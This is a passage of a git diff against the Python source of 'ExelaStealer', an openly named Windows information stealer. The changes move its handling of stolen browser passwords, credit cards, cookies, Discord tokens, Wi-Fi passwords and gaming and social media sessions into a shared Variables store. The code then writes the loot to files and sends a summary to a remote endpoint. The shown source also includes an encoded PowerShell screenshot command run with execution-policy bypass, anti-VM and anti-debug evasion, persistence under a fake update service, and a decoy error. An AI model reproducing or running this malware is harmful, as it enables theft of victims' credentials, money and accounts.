ZQBlAG4AcwBoAG8AdABzAFsAJABpAF0ADQAKACAAIAAgACAAJABzAGMAcgBlAGUAbgBzAGgAbwB0AC4AUwBhAHYAZQAoACIALgAvAEQAaQBzAHAAbABhAHkAIAAoACQAKAAkAGkAKwAxACkAKQAuAHAAbgBnACIAKQANAAoAIAAgACAAIAAkAHMAYwByAGUAZQBuAHMAaABvAHQALgBEAGkAcwBwAG8AcwBlACgAKQANAAoAfQA=" # Unicode encoded command
             process = await asyncio.create_subprocess_shell(f"powershell.exe -NoProfile -ExecutionPolicy Bypass -EncodedCommand {command}",cwd=filePath,shell=True)
             await process.communicate() 
-            if self.processList:
+            password_list = Variables.Passwords
+            card_list = Variables.Cards
+            cookie_list = Variables.Cookies
+            history_list = Variables.Historys
+            bookmark_list = Variables.Bookmarks
+            autofill_list = Variables.Autofills
+            download_list = Variables.Downloads
+            riot_acc = Variables.RiotGameAccounts
+            insta_acc = Variables.InstagramAccounts
+            twitter_acc = Variables.TwitterAccounts
+            tiktok_acc = Variables.TikTokAccounts
+            reddit_acc = Variables.RedditAccounts
+            twitch_acc = Variables.TwtichAccounts
+            spotify_acc = Variables.SpotifyAccounts
+            steam_acc = Variables.SteamAccounts
+            roblox_acc = Variables.RobloxAccounts
+
+            processList = Variables.Processes
+            if processList:
                 with open(os.path.join(filePath, "process_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for proc in self.processList:
+                    for proc in processList:
                         file.write(proc)
-            if self.lastCipboardList:
+            if Variables.ClipBoard:
                 with open(os.path.join(filePath, "last_clipboard.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for lstclip in self.lastCipboardList:
+                    for lstclip in Variables.ClipBoard:
                         file.write(lstclip)
             if self.FirefoxCookieList:
                 with open(os.path.join(filePath, "Browsers", "Firefox", "Cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
@@ -1683,115 +1670,115 @@ class Main:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
                     for fautofill in self.FirefoxAutofiList:
                         file.write(fautofill)
-            if self.password_list:
+            if password_list:
                 with open(os.path.join(filePath, "Browsers", "Passwords.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for passwords in self.password_list:
+                    for passwords in password_list:
                         file.write(passwords)
-            if self.card_list:
+            if card_list:
                 with open(os.path.join(filePath, "Browsers", "Cards.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for cards in self.card_list:
+                    for cards in card_list:
                         file.write(cards)
-            if self.cookie_list:
+            if cookie_list:
                 with open(os.path.join(filePath, "Browsers", "Cookies.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for cookies in self.cookie_list:
+                    for cookies in cookie_list:
                         file.write(cookies)
-            if self.history_list:
+            if history_list:
                 with open(os.path.join(filePath, "Browsers", "Historys.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for historys in self.history_list:
+                    for historys in history_list:
                         file.write(historys)
-            if self.download_list:
+            if download_list:
                 with open(os.path.join(filePath, "Browsers", "Autofills.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for autofill in self.autofill_list:
+                    for autofill in download_list:
                         file.write(autofill)
-            if self.bookmark_list:
+            if bookmark_list:
                 with open(os.path.join(filePath, "Browsers", "Bookmarks.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for bookmark in self.bookmark_list:
+                    for bookmark in bookmark_list:
                         file.write(bookmark)           
-            if self.download_list:
+            if download_list:
                 with open(os.path.join(filePath, "Browsers", "Downloads.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for downloads in self.download_list:
+                    for downloads in download_list:
                         file.write(downloads)
-            if self.riotGamesSessionList:
+            if riot_acc:
                 with open(os.path.join(filePath, "Sessions", "riot_games.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for riotgames in self.riotGamesSessionList:
+                    for riotgames in riot_acc:
                         file.write(riotgames)
-            if self.instagramSessionList:
+            if insta_acc:
                 with open(os.path.join(filePath, "Sessions", "instagram_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for insta in self.instagramSessionList:
+                    for insta in insta_acc:
                         file.write(insta)
-            if self.tiktokSessionList:
+            if tiktok_acc:
                 with open(os.path.join(filePath, "Sessions", "tiktok_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for tiktok in self.tiktokSessionList:
+                    for tiktok in tiktok_acc:
                         file.write(tiktok)
-            if self.twitterSessionList:
+            if twitter_acc:
                 with open(os.path.join(filePath, "Sessions", "twitter_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for twitter in self.twitterSessionList:
+                    for twitter in twitter_acc:
                         file.write(twitter)
-            if self.redditSessionList:
+            if reddit_acc:
                 with open(os.path.join(filePath, "Sessions", "reddit_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for reddit in self.redditSessionList:
+                    for reddit in reddit_acc:
                         file.write(reddit)
-            if self.twitchSessionList:
+            if twitch_acc:
                 with open(os.path.join(filePath, "Sessions", "twitch_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for twitch in self.twitchSessionList:
+                    for twitch in twitch_acc:
                         file.write(twitch)
-            if self.spotifySessionList:
+            if spotify_acc:
                 with open(os.path.join(filePath, "Sessions", "spotify_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for spotify in self.spotifySessionList:
+                    for spotify in spotify_acc:
                         file.write(spotify)
-            if self.robloxSessionList:
+            if roblox_acc:
                 with open(os.path.join(filePath, "Sessions", "roblox_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for roblox in self.robloxSessionList:
+                    for roblox in roblox_acc:
                         file.write(roblox)
-            if self.steamSessionList:
+            if steam_acc:
                 with open(os.path.join(filePath, "Sessions", "steam_sessions.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for steam in self.steamSessionList:
+                    for steam in steam_acc:
                         file.write(steam)
-            if self.discordAccountList:
+            if Variables.DiscordAccounts:
                 with open(os.path.join(filePath, "Tokens", "discord_accounts.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for discord in self.discordAccountList:
+                    for discord in Variables.DiscordAccounts:
                         file.write(discord)
-            if self.full_tokens:
+            if Variables.FullTokens:
                 with open(os.path.join(filePath, "Tokens", "full_tokens.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for token in self.full_tokens:
+                    for token in Variables.FullTokens:
                         file.write(token + "\n")    
-            if self.validated_tokens:
+            if Variables.ValidatedTokens:
                 with open(os.path.join(filePath, "Tokens", "validated_tokens.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for validated_token in self.validated_tokens:
+                    for validated_token in Variables.ValidatedTokens:
                         file.write(validated_token + "\n")   
-            if self.wifiList:
+            if Variables.Wifis:
                 with open(os.path.join(filePath, "wifi_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for profile_name, profile_password in self.wifiList:
+                    for profile_name, profile_password in Variables.Wifis:
                         file.write(f"WiFi Profile: {str(profile_name)}\nPassword: {str(profile_password)}\n\n")
-            if self.systeminfoList:
+            if Variables.SystemInfo:
                 with open(os.path.join(filePath, "system_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for sysmteminfo in self.systeminfoList:
+                    for sysmteminfo in Variables.SystemInfo:
                         file.write(str(sysmteminfo))
-            if self.NetworkList:
+            if Variables.Network:
                 with open(os.path.join(filePath, "network_info.txt"), "a", encoding="utf-8", errors="ignore") as file:
                     file.write("----------------------https://t.me/ExelaStealer----------------------\n"+ "=" * 70 + "\n")
-                    for ip, country,city, timezone, isp in self.NetworkList:
+                    for ip, country,city, timezone, isp in Variables.Network:
                         file.write(ip + "\n" + country + "\n" + city +"\n" + timezone + "\n" + isp) 
             if len(os.listdir(os.path.join(filePath, "Sessions"))) == 0:
                 try:
@@ -1816,17 +1803,17 @@ class Main:
                 found_autofill = False 
                 found_passw = False  
                 found_cookie = False
-                for auts in self.autofill_list:
+                for auts in Variables.Autofills:
                     if c in auts:
                         found_autofill = True  
                         break  
                 
-                for pssw in self.password_list:
+                for pssw in Variables.Passwords:
                     if c in pssw:
                         found_passw = True  
                         break  
                 
-                for cooks in self.cookie_list:
+                for cooks in Variables.Cookies:
                     if c in cooks:
                         found_cookie = True
                         break  
@@ -1890,24 +1877,24 @@ class Main:
             "footer": {"text": "https://t.me/ExelaStealer | https://github.com/quicaxd"},
             "thumbnail": {"url": "https://media.discordapp.net/attachments/1133692440029700117/1140245373496074270/195198d656ec1e2b59a6a823bb250272.jpg?width=489&height=468"}}
         fields = [
-             {"name": "Password", "value": "``" + str(len(self.password_list)) + "``", "inline": True},
-             {"name": "Card", "value": "``" + str(len(self.card_list)) + "``", "inline": True},
-             {"name": "Cookie", "value": "``" +  str(len(self.cookie_list) + len(self.FirefoxCookieList)) + "``", "inline": True},
-             {"name": "History", "value": "``" + str(len(self.history_list) + len(self.FirefoxHistoryList)) + "``", "inline": True},
-             {"name": "Download", "value":"``" + str(len(self.download_list)) + "``", "inline": True},
-             {"name": "Bookmark", "value": "``" + str(len(self.bookmark_list)) + "``", "inline": True},
-             {"name": "Autofill", "value": "``" + str(len(self.autofill_list) + len(self.FirefoxAutofiList)) + "``", "inline": True},
-             {"name": "Tokens", "value": "``" + str(len(self.full_tokens)) + "``", "inline": True},
-             {"name": "Instagram", "value": "``" + str(len(self.instagramSessionList)) + "``", "inline": True},
-             {"name": "Twitter", "value": "``" + str(len(self.twitterSessionList)) + "``", "inline": True},
-             {"name": "TikTok", "value": "``" + str(len(self.tiktokSessionList)) + "``", "inline": True},
-             {"name": "Twitch", "value": "``" + str(len(self.twitchSessionList)) + "``", "inline": True},
-             {"name": "Reddit", "value": "``" + str(len(self.redditSessionList)) + "``", "inline": True},
-             {"name": "Spotify", "value": "``" + str(len(self.spotifySessionList)) + "``", "inline": True},
-             {"name": "Riot Game's", "value": "``" + str(len(self.riotGamesSessionList)) + "``", "inline": True},
-             {"name": "Roblox", "value": "``" + str(len(self.robloxSessionList)) + "``", "inline": True},
-             {"name": "Steam", "value": "``" + str(len(self.steamSessionList)) + "``", "inline": True},
-             {"name": "Wifi", "value": "``" + str(len(self.wifiList)) + "``", "inline": True},
+             {"name": "Password", "value": "``" + str(len(Variables.Passwords)) + "``", "inline": True},
+             {"name": "Card", "value": "``" + str(len(Variables.Cards)) + "``", "inline": True},
+             {"name": "Cookie", "value": "``" +  str(len(Variables.Cookies) + len(self.FirefoxCookieList)) + "``", "inline": True},
+             {"name": "History", "value": "``" + str(len(Variables.Historys) + len(self.FirefoxHistoryList)) + "``", "inline": True},
+             {"name": "Download", "value":"``" + str(len(Variables.Downloads)) + "``", "inline": True},
+             {"name": "Bookmark", "value": "``" + str(len(Variables.Bookmarks)) + "``", "inline": True},
+             {"name": "Autofill", "value": "``" + str(len(Variables.Autofills) + len(self.FirefoxAutofiList)) + "``", "inline": True},
+             {"name": "Tokens", "value": "``" + str(len(Variables.FullTokens)) + "``", "inline": True},
+             {"name": "Instagram", "value": "``" + str(len(Variables.InstagramAccounts)) + "``", "inline": True},
+             {"name": "Twitter", "value": "``" + str(len(Variables.TwitterAccounts)) + "``", "inline": True},
+             {"name": "TikTok", "value": "``" + str(len(Variables.TikTokAccounts)) + "``", "inline": True},
+             {"name": "Twitch", "value": "``" + str(len(Variables.TwtichAccounts)) + "``", "inline": True},
+             {"name": "Reddit", "value": "``" + str(len(Variables.RedditAccounts)) + "``", "inline": True},
+             {"name": "Spotify", "value": "``" + str(len(Variables.SpotifyAccounts)) + "``", "inline": True},
+             {"name": "Riot Game's", "value": "``" + str(len(Variables.RiotGameAccounts)) + "``", "inline": True},
+             {"name": "Roblox", "value": "``" + str(len(Variables.RobloxAccounts)) + "``", "inline": True},
+             {"name": "Steam", "value": "``" + str(len(Variables.SteamAccounts)) + "``", "inline": True},
+             {"name": "Wifi", "value": "``" + str(len(Variables.Wifis)) + "``", "inline": True},
              {"name": "FireFox?", "value": "``" + str(self.FireFox) + "``", "inline": True},]
         embed_data["fields"] = fields
         async with aiohttp.ClientSession(connector=aiohttp.TCPConnector(ssl=True)) as session:
@@ -1947,7 +1934,7 @@ class Startup:
         self.LocalAppData = os.getenv("LOCALAPPDATA")
         self.RoamingAppData = os.getenv("APPDATA")
         self.CurrentFile = os.path.abspath(sys.argv[0])
-        self.Privalage:bool = ctypes.windll.shell32.IsUserAnAdmin()
+        self.Privalage:bool = SubModules.IsAdmin()
         self.ToPath:str = os.path.join(self.LocalAppData, "ExelaUpdateService", "Exela.exe")
     async def main(self) -> None:
         await self.CreatePathAndMelt()
@@ -2239,11 +2226,10 @@ async def Fakerror() -> None:
 
 if __name__ == '__main__':
     if os.name == "nt":
-        if not create_mutex("Exela | Stealar | on top |"):
+        if not SubModules.create_mutex("Exela | Stealar | on top |"):
             print("mutex already exist")
             os._exit(0)
         else:
-            start_time = time.time()
             if Anti_VM:
                 asyncio.run(AntiVM().Main())
             asyncio.run(AntiDebug().calback())
@@ -2252,6 +2238,5 @@ if __name__ == '__main__':
             asyncio.run(Fakerror())
             main_instance = Main()
             asyncio.run(main_instance.main())
-            print(f"The code executed on: {str(time.time() - start_time)} second")
     else:
         print("just Windows Operating system's supported by Exela")
